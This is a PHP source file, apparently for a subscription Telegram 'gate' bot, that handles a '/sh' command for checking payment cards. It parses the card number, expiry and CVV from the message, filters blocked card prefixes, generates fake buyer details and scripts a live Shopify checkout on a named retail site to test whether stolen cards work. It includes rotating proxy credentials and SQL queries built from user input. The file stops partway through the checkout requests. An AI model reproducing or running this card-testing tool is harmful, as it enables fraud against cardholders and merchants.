<?php
list($cmd) = explode(" ", $text);
if($cmd == "/sh" or $cmd == ".sh" or $cmd == "!sh" or $cmd == "?sh" or $cmd == "#sh" or $cmd == ":sh" or $cmd == ",sh"){ 

    // if($user_id !=5197853005){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ Proxy Dead", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //     SendMessage($content);
    //     exit();
    // }
    if($cmd == '/sh'){
        $gatecmd = "sh";
    }elseif($cmd == ".sh"){
        $gatecmd = "sh";
    }elseif($cmd == "!sh"){
        $gatecmd = "sh";
    }elseif($cmd == "?sh"){
        $gatecmd = "sh";
    }elseif($cmd == "#sh"){
        $gatecmd = "sh";
    }elseif($cmd == ":sh"){
        $gatecmd = "sh";
    }elseif($cmd == ",sh"){
        $gatecmd = "sh";
    }
    $lista = explode(" ", $text)[1];
    $sql = "SELECT planexpiry FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("test.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $planexpiry = anicap($final2, '"planexpiry":"','"');
    mysqli_close(mysqlcon());
    
    $sql = "SELECT gatecmd FROM gateway WHERE gatecmd='$gatecmd'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $gatec = anicap($final2, '"gatecmd":"','"');
    mysqli_close(mysqlcon());
    $sql = "SELECT status FROM gateway WHERE gatecmd='sh'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    
    $file = fopen("testt.txt","w");
    echo fwrite($file,$message_id);
    fclose($file);
    
    $status = anicap($final2, '"status":"','"');
    mysqli_close(mysqlcon());
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    $sql = "SELECT plan FROM administrar WHERE id='$user_id'";
    $result = mysqli_query(mysqlcon(), $sql);
    
    $json_array = [];
    
    
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    
    $final2 = json_encode($json_array);
    
    $plan = anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    
    $now = time();
    if($gatec != $gatecmd){
        $content = ['chat_id' => $chat_id, 'text' => "<b>Gate not added, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk </b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    // Check connection
    // Attempt create database query execution
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    // Close connection
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "<b>𝒀𝒐𝒖𝒓 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒑𝒕𝒊𝒐𝒏 𝒑𝒍𝒂𝒏 𝒊𝒔 𝒆𝒙𝒑𝒊𝒓𝒆𝒅, 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk 𝒕𝒐 𝒓𝒆𝒏𝒆𝒘</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    $SQL = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $chats =anicap($final2, '"chats":"','"');
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔𝒏'𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆, 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{
        
       
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $plan =anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{}
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
    if($first1 == "4"){
        $cc_type = "5963a708-fc7f-48af-952f-16d574c4b833";
    }
    if($first1 == "5"){
        $cc_type = "b34832f7-8a95-47fa-9c43-bc8682562ea5";
    }
    if($first1 == "3"){
        $cc_type = "c4a56513-9fdb-44c5-9b19-e617f2596107";
    }
    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
    $cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

    //        'ihojryep-rotate:a75v25f6afx1',
    //"psyohwld-rotate:hdxu4zfaz5ip",
    $rotate = array(
        'U99pbU:yM0wAf',
        'oCqNRH:i18i58',
        'PfO6EN:3j04W4',
        'oXGn5O:E3lj3G',
        'lr9wwO:x33pVi',
        '2jCHw9:KzDDgy',
        'UbFFce:3Ftrj2',
        'K5VKJa:8zdAZT',
        'f951hv:k0YRer',
        '1pYsMR:TonSB4',
        'A7t28n:XEDwsb',

        );
        
        $user_pass = $rotate[array_rand($rotate)];
    //         "AUTH"   => "unoehbda-rotate:2bxs8q2xfbks"
    $server = [
        "METHOD" => "CUSTOM",
        "SERVER" => "p.webshare.io:80",


        "AUTH"   => "rteavycr-rotate:f9o3l1ryizdq"
    ];
    

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        $time = 30;
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < 30)
        {
            $TotalTime = $time - $TIMEAC;
            if($plan !== "Free User"){

            }elseif($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 : <code><i>$TotalTime</i></code>s\n══════════════════════</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
    $banned_bins = ['485953', '650907', '515462', '489504', '534417', '483698', '403015', '435880', '522158', '515478', '440393', '472926', '498503', '542418', '559900', '540324', '484718', '423223', '510404', '546616', '459192', '510409', '539817', '429435', '426370', '521069', '549627', '437507', '542717', '520593', '494656', '529794', '457286', '428303', '476771', '531106', '494160', '411810', '409177', '481969', '536595', '557945', '485340', '530446', '511114', '559591', '549184', '414720', '546775', '414397', '437303', '424067', '540449', '475465', '524038', '435167', '511098', '499818', '537489', '547115', '414398', '512487', '420495', '430460', '521380', '425032', '530544', '491449', '522714', '567511', '154620', '432672', '537445', '526293', '403935', '533621', '401924', '402360', '489049', '533325', '402018', '405482', '535463', '533814', '529559', '538923', '535456', '531108', '541591', '481776', '403446', '540302', '533935', '498872', '540608', '472776', '533248', '484224', '446053', '410039', '601120', '442732', '377935', '543816', '601149', '372300', '529750', '415285', '415231', '473327', '408832', '514503', '523434', '450742', '518375', '485246', '537664', '554714', '533728', '525855', '410489', '522686', '412003', '443161', '440229', '459510', '539123', '519325', '531340', '530347', '516488', '436681', '559911', '457572', '464732', '546001', '468840', '453756', '525103', '601140', '545348', '533317', '411600', '537697', '511558', '467199', '464556', '424002', '557348', '442743', '530551', '403995', '483039', '483316', '416860', '521403', '405433', '539689', '526736', '481775', '515472', '511516', '442062', '526274', '444607', '539636', '451431', '533582', '438959', '402361', '445785', '512773', '453744', '539634', '511361', '440353', '455172', '529053', '520828', '404841', '473690', '478499', '539591', '416995', '526491', '422589', '419113', '469395', '548793', '515477', '402063', '527527', '527368', '549399', '554730', '467321', '533004', '526430', '441686', '428149', '493452', '523471', '453308', '428346', '428307', '416722', '529086', '454481', '414693', '411192', '413514', '516989', '513213', '400045', '481285', '519404', '519280', '540226', '511565', '527346', '441101', '539854', '530706', '559758', '517805', '511673', '527789', '511332', '530690', '542935', '529275', '511774', '524467', '452018', '403530', '469396', '511350', '511321', '404386', '473947', '485912', '409758', '517476', '527837', '535971', '515519', '400331', '493595', '511564', '527395', '445507', '536659', '432465', '522096', '439457', '400921', '453081', '522157', '404585', '538875', '516121', '522719', '534228', '544544', '491288', '511563', '528227', '453973', '544586', '403905', '516155', '537207', '411894', '408635', '522725', '539226', '526250', '441070', '424840', '515101', '512092', '529063', '489212', '511317', '457949', '533862', '527329', '515549', '410352', '407714', '400632', '451002', '537911', '530772', '428486', '511330', '519532', '546324', '516532', '533813', '548274', '516502', '510087', '557838', '513207', '530964', '514998', '534548', '516520', '516508', '542837', '533281', '511560', '527351', '529567', '448975', '531170', '515554', '533821', '535480', '544768', '423991', '538651', '533984', '532081', '425096', '538792', '511089', '530082', '537666', '539186', '527069', '539175', '548566', '544679', '485320', '451129', '517163', '420064', '533323', '494159', '526724', '537915', '484735', '527660', '401188', '432168', '512150', '533842', '511467', '513252', '532164', '401921', '479613', '468271', '401719', '402400', '401658', '400022', '475129', '416598', '548398', '506731', '563294', '459354', '549622', '416994', '639167', '475675', '472409', '415059', '432154', '445677', '419973', '455479', '427432', '510126', '529172', '529923', '428813', '532613', '454861', '540300', '540305', '540309', '540333', '540335', '540350', '540356', '540357', '540369', '540396', '544215', '554723', '554756', '627895', '376752', '357401', '372742', '375150', '422803', '459654', '530072', '466544', '468789', '514858', '422403', '473653',];
        // if($bin == "440393"){
        //     $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        //     $m1  = SendMessage($content);
        //     exit;
        // }else {
                
        // }
        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE ADMINISTRAR SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■□□□□</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
        $m2  = EditMessageText($content);
        $m2i = $m2['result']['message_id'];

        /*----------  R2 CAPTCHA  ----------*/
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];
#-------------------- Bin -------------#
$cctwo = substr("$cc", 0, 6);
$curl = curl_init();
curl_setopt_array($curl, [
CURLOPT_URL => "https://bins-su-ani.vercel.app/api/".$bin,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 30,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_HTTPHEADER => [
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
"sec-fetch-dest: document",
"sec-fetch-site: none",
"user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
],
]);

$result = curl_exec($curl);
curl_close($curl);
$data = json_decode($result, true);
$bank = $data['data']['bank'];
$country = $data['data']['country'];
$brand = $data['data']['vendor'];
$level = $data['data']['level'];
$type = $data['data']['type'];
$flag = $data['data']['countryInfo']['emoji'];
$result1 = $data['result'];


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('anibhai'));
$last = ucfirst(str_shuffle('pemro'));
$email = "Dabilol".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

        /*----------  R2 STRIPE  ----------*/
$cookie = uniqid();
// hub-us-7.litport.net:31337:oCqNRH:i18i58
$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://www.corporatetraditions.com/products/google-play-5-gift-card?_pos=1&_sid=a3c67ba7d&_ss=r');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: www.corporatetraditions.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.corporatetraditions.com/search?q=google+play';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$api_key = getData($curl, "apiKey: '","'");

# ------------------------------------------------------------------------- [2 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/api/2021-07/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: *';
$headers[] = 'Referer: https://www.corporatetraditions.com/';
$headers[] = 'Content-Type: application/json';
$headers[] = 'X-SDK-Variant: javascript';
$headers[] = 'X-SDK-Version: 2.12.0';
$headers[] = 'X-Shopify-Storefront-Access-Token: '.$api_key.'';
$headers[] = 'X-SDK-Variant-Source: buy-button-js';
$headers[] = 'Origin: https://www.corporatetraditions.com';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'TE: trailers';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"fragment VariantFragment on ProductVariant  { id,title,price,priceV2 { amount,currencyCode },presentmentPrices (first: 20) { pageInfo { hasNextPage,hasPreviousPage },edges { node { price { amount,currencyCode },compareAtPrice { amount,currencyCode } } } },weight,available: availableForSale,sku,compareAtPrice,compareAtPriceV2 { amount,currencyCode },image { id,src: originalSrc,altText },selectedOptions { name,value },unitPrice { amount,currencyCode },unitPriceMeasurement { measuredType,quantityUnit,quantityValue,referenceUnit,referenceValue } },fragment DiscountApplicationFragment on DiscountApplication  { __typename,targetSelection,allocationMethod,targetType,value { ... on MoneyV2 { amount,currencyCode },... on PricingPercentageValue { percentage } },... on ManualDiscountApplication { title,description },... on DiscountCodeApplication { code,applicable },... on ScriptDiscountApplication { description },... on AutomaticDiscountApplication { title } },fragment AppliedGiftCardFragment on AppliedGiftCard  { amountUsedV2 { amount,currencyCode },balanceV2 { amount,currencyCode },presentmentAmountUsed { amount,currencyCode },id,lastCharacters },fragment VariantWithProductFragment on ProductVariant  { ...VariantFragment,product { id,handle } },fragment UserErrorFragment on UserError  { field,message },fragment CheckoutUserErrorFragment on CheckoutUserError  { field,message,code },fragment MailingAddressFragment on MailingAddress  { id,address1,address2,city,company,country,firstName,formatted,lastName,latitude,longitude,phone,province,zip,name,countryCode: countryCodeV2,provinceCode },fragment CheckoutFragment on Checkout  { id,ready,requiresShipping,note,paymentDue,paymentDueV2 { amount,currencyCode },webUrl,orderStatusUrl,taxExempt,taxesIncluded,currencyCode,totalTax,totalTaxV2 { amount,currencyCode },lineItemsSubtotalPrice { amount,currencyCode },subtotalPrice,subtotalPriceV2 { amount,currencyCode },totalPrice,totalPriceV2 { amount,currencyCode },completedAt,createdAt,updatedAt,email,discountApplications (first: 10) { pageInfo { hasNextPage,hasPreviousPage },edges { node { __typename,...DiscountApplicationFragment } } },appliedGiftCards { ...AppliedGiftCardFragment },shippingAddress { ...MailingAddressFragment },shippingLine { handle,price,priceV2 { amount,currencyCode },title },customAttributes { key,value },order { id,processedAt,orderNumber,subtotalPrice,subtotalPriceV2 { amount,currencyCode },totalShippingPrice,totalShippingPriceV2 { amount,currencyCode },totalTax,totalTaxV2 { amount,currencyCode },totalPrice,totalPriceV2 { amount,currencyCode },currencyCode,totalRefunded,totalRefundedV2 { amount,currencyCode },customerUrl,shippingAddress { ...MailingAddressFragment },lineItems (first: 250) { pageInfo { hasNextPage,hasPreviousPage },edges { cursor,node { title,variant { ...VariantWithProductFragment },quantity,customAttributes { key,value } } } } },lineItems (first: 250) { pageInfo { hasNextPage,hasPreviousPage },edges { cursor,node { id,title,variant { ...VariantWithProductFragment },quantity,customAttributes { key,value },discountAllocations { allocatedAmount { amount,currencyCode },discountApplication { __typename,...DiscountApplicationFragment } } } } } },mutation ($input:CheckoutCreateInput!)  { checkoutCreate (input: $input) { userErrors { ...UserErrorFragment },checkoutUserErrors { ...CheckoutUserErrorFragment },checkout { ...CheckoutFragment } } }","variables":{"input":{"lineItems":[{"variantId":"Z2lkOi8vc2hvcGlmeS9Qcm9kdWN0VmFyaWFudC8zMTc3Mjg5NzUwOTQ3OQ==","quantity":1}]}}}');
$curl = curl_exec($ch);
curl_close($ch);
$id0 = getData($curl, 'myshopify.com\/','\/');
$id1 = getData($curl, '\/checkouts\/','?key=');
$id2 = getData($curl, '?key=','"');

# ------------------------------------------------------------------------- [3 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'?key='.$id2.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'DNT: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://www.corporatetraditions.com/';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$auth1 = getData($curl, 'input type="hidden" name="authenticity_token" value="','"');

# ------------------------------------------------------------------------- [4 Req] ------------------------------------------------------------------------ #

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "hub-us-7.litport.net:31337");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$user_pass");
curl_setopt($ch, CURLOPT_URL, 'https://corporate-traditions.myshopify.com/'.$id0.'/checkouts/'.$id1.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: corporate-traditions.myshopify.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Referer: https://corporate-traditions.myshopify.com/';
